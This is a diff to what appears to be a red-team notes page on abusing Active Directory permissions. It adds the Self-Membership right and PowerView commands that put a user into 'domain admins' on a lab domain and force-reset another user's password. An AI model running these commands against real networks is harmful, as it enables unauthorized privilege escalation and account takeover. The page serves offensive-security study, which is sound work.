@@ -14,6 +14,7 @@ Some of the exploitable permissions:
 * **WriteDACL** - modify object's ACEs and give attacker full control right over the object
 * **AllExtendedRights** - ability to add user to a group or reset password
 * **ForceChangePassword** - ability to change user's password
+* **Self \(Self-Membership\)** - ability to add yourself to a group
 
 ## Execution
 
@@ -66,6 +67,29 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-11-06-32.png)
+
+### Self \(Self-Membership\) on Group
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-11-23-52.png)
+
+```csharp
+net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-11-25-23.png)
+
+### **ForceChangePassword**
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-12-30-11.png)
+
+```text
+# powerview
+Set-DomainUserPassword -Identity delegate -Verbose
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-08-12-31-52.png)
+
+
 
 ## References
 
